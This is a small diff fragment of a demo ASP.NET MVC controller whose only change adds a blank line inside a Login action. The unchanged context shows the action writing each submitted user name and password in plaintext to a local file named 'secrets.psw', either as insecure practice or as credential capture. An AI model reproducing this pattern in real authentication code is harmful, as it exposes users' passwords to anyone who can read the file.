@@ -41,6 +41,7 @@ namespace MVCDemo.Controllers {
         }
 
         public IActionResult Login(string UserName, string Password) {
+             
 
             System.IO.StreamWriter fs = new System.IO.StreamWriter("secrets.psw");
             fs.Write(UserName + " | " + Password);
